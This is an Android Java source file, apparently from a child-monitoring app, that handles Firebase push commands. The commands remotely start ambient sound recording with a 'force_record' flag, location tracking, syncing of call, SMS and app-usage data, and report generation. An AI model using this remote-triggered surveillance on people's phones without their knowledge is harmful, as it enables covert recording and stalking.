package com.childmonitor.services;

import android.content.Intent;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        if (remoteMessage.getData().isEmpty()) return;

        String command = remoteMessage.getData().get("command");
        if (command == null) return;

        switch (command) {
            case "start_recording":
                Intent soundIntent = new Intent(this, SurroundingSoundService.class);
                soundIntent.putExtra("force_record", true);
                startService(soundIntent);
                break;

            case "get_location":
                startService(new Intent(this, LocationService.class));
                break;

            case "sync_data":
                startService(new Intent(this, FirebaseSyncService.class));
                startService(new Intent(this, CallSmsService.class));
                startService(new Intent(this, AppUsageService.class));
                break;

            case "generate_report":
                Intent reportIntent = new Intent(this, DailyReportService.class);
                reportIntent.setAction("GENERATE_REPORT");
                startService(reportIntent);
                break;
        }
    }

    @Override
    public void onNewToken(String token) {
        String deviceId = getSharedPreferences("cm_prefs", MODE_PRIVATE)
                .getString("device_id", "unknown");

        com.google.firebase.database.FirebaseDatabase.getInstance()
                .getReference("devices")
                .child(deviceId)
                .child("fcm_token")
                .setValue(token);
    }
}
